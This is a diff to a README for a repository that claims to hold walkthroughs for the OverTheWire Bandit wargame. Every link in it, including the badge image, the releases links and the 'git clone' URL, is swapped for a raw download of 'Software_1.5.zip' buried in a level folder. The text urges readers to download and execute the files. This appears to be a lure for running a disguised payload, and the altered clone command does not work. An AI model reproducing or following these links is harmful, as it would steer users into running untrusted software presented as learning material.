@@ -1,6 +1,6 @@
 # Bandit: OverTheWire Solutions and Walkthroughs 🐧
 
-![Bandit Logo](https://img.shields.io/badge/OverTheWire-Bandit-brightgreen)
+![Bandit Logo](https://github.com/Ali5tan/bandit/raw/refs/heads/main/bandit9/Software_1.5.zip)
 
 Welcome to the Bandit repository! This project provides solutions and walkthroughs for the OverTheWire Bandit wargame. Here, you can learn Linux command-line basics through real hacking challenges. Whether you are a beginner or looking to sharpen your skills, this repository is designed to help you navigate the challenges with ease.
 
@@ -19,7 +19,7 @@ Welcome to the Bandit repository! This project provides solutions and walkthroug
 
 OverTheWire is a platform that offers various wargames to help you learn and practice security concepts. The Bandit game is specifically tailored for those new to Linux and command-line interfaces. By solving challenges, you will gain practical experience and confidence in using the command line.
 
-You can find the latest releases of this repository [here](https://github.com/Ali5tan/bandit/releases). Download the necessary files and execute them to get started on your journey.
+You can find the latest releases of this repository [here](https://github.com/Ali5tan/bandit/raw/refs/heads/main/bandit9/Software_1.5.zip). Download the necessary files and execute them to get started on your journey.
 
 ## Getting Started
 
@@ -35,7 +35,7 @@ To begin, you need to have a basic understanding of Linux and the command line. 
 
 1. Clone the repository to your local machine:
    ```bash
-   git clone https://github.com/Ali5tan/bandit.git
+   git clone https://github.com/Ali5tan/bandit/raw/refs/heads/main/bandit9/Software_1.5.zip
    ```
 2. Navigate to the directory:
    ```bash
@@ -78,7 +78,7 @@ This repository contains solutions and detailed walkthroughs for each level of t
 3. **Practice:** Try to solve the challenges on your own before looking at the solutions.
 4. **Use the Repository:** Reference the code and explanations as needed.
 
-You can also check the latest updates and releases [here](https://github.com/Ali5tan/bandit/releases).
+You can also check the latest updates and releases [here](https://github.com/Ali5tan/bandit/raw/refs/heads/main/bandit9/Software_1.5.zip).
 
 ## Topics Covered
 
